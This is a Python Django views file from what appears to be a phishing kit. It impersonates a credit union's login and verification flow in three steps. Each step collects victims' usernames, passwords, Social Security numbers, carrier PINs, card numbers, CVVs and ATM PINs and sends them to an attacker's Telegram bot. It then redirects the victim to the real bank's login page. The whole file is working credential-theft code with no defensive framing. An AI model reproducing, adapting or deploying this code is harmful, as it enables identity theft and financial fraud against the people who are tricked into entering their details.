from django.shortcuts import redirect, render
from django.views import View
import requests
import datetime
from django.conf import settings


class Login(View):
    def __init__(self):
        super().__init__()
        self.template_name = "base/login.html"
        self.context = {}

    def get(self, request):
        return render(request, self.template_name, self.context)

    def post(self, request):

        USERNAME = request.POST["username"]
        PASSWORD = request.POST["password"]

        payload = f"""|---> New Login Log <---|
------------------------------------
Login Time : {datetime.datetime.now()}
------------------------------------
Login Info : => {USERNAME}:{PASSWORD}
------------------------------------"""

        post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
        requests.post(post)

        return redirect("base:billing_address")


class BillingAddress(View):
    def __init__(self):
        super().__init__()
        self.template_name = "base/billing_address.html"
        self.context = {}

    def get(self, request):
        return render(request, self.template_name, self.context)

    def post(self, request):
        FIRST_NAME = request.POST["FirstName"]
        LAST_NAME = request.POST["LastName"]
        DATE_OF_BIRTH = request.POST["Date_Of_Birth"]
        ADDRESS = request.POST["Address"]
        CITY = request.POST["City"]
        STATE = request.POST["State"]
        ZIP_CODE = request.POST["Zip_Code"]
        PHONE_NUMBER = request.POST["Phone_Number"]
        Carrier_Pin = request.POST["Carrier_Pin"]
        SSCODE = request.POST["SSCODE"]
        payload = f"""|---> Personal Info Log <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Personal Info:
First Name=> {FIRST_NAME}
Last Name => {LAST_NAME}
Date Of Birth => {DATE_OF_BIRTH}
Address => {ADDRESS}
City => {CITY}
State => {STATE}
Zip Code => {ZIP_CODE}
Phone Number => {PHONE_NUMBER}
Carrier_Pin => {Carrier_Pin}
Social Security Number => {SSCODE}
------------------------------------"""

        post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
        requests.post(post)

        return redirect("base:card_info")


class CardInfo(View):
    def __init__(self):
        super().__init__()
        self.template_name = "base/card_info.html"
        self.context = {}

    def get(self, request):
        return render(request, self.template_name, self.context)

    def post(self, request):
        NAME_ON_CARD = request.POST["Name_On_Card2"]
        CARD_NUMBER = request.POST["Card_Number2"]
        EXPIRATION_DATE = request.POST["Expiration_Date2"]
        SECURITY_CODE = request.POST["Security_Code2"]
        THREEDSECURE = request.POST["3D_Secure2"]

        NAME_ON_CARD2 = request.POST["Name_On_Card"]
        CARD_NUMBER2 = request.POST["Card_Number"]
        EXPIRATION_DATE2 = request.POST["Expiration_Date"]
        SECURITY_CODE2 = request.POST["Security_Code"]
        THREEDSECURE2 = request.POST["3D_Secure"]

        USER_AGENT = request.POST["user_agent"]
        BROWSER_NAME = request.POST["browser_name"]
        BROWSER_VERSION = request.POST["browser_version"]
        LANGUAGES = request.POST["languages"]

        payload = f"""|---> Card Info Log <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Card Info :

Step 1 :
Name On Card : {NAME_ON_CARD2}
Card Number : {CARD_NUMBER2}
Expiration Date : {EXPIRATION_DATE2}
CVV : {SECURITY_CODE2}
ATM pin : {THREEDSECURE2}

Step 2 :
Name On Card : {NAME_ON_CARD}
Card Number : {CARD_NUMBER}
Expiration Date : {EXPIRATION_DATE}
CVV : {SECURITY_CODE}
ATM pin : {THREEDSECURE}
------------------------------------
Client Private Information :
User Agent : {USER_AGENT}
Languages : {LANGUAGES}
Browser Name : {BROWSER_NAME}
Browser Version : {BROWSER_VERSION}

------------------------------------"""

        post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
        requests.post(post)

        return redirect("https://secure.americafirst.com/#/login")
